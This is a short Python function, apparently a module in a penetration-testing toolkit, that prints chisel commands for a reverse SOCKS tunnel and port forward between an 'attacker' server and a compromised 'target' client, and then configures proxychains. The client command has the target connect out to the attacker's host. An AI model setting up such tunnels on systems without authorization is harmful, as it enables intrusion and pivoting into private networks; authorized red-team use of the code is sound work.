"""Print chisel server/client commands for tunneling."""


def run(ctx):
    lhost = str(ctx.inputs.get("lhost"))
    lport = str(ctx.inputs.get("lport"))
    target_host = str(ctx.inputs.get("target_host") or "")
    target_port = str(ctx.inputs.get("target_port"))

    print("[+] Chisel Tunneling")
    print(f"    Server (attacker): chisel server -p {lport} --reverse")
    print(f"    Client (target):  chisel client {lhost}:{lport} R:socks")
    print("    Then configure proxychains: socks5 127.0.0.1 1080")

    if target_host:
        print("\n[+] Chisel Port Forward")
        print(
            f"    Client: chisel client {lhost}:{lport} R:{target_port}:{target_host}:{target_port}"
        )

    ctx.add_outputs(method="chisel", server_port=lport, server_host=lhost)
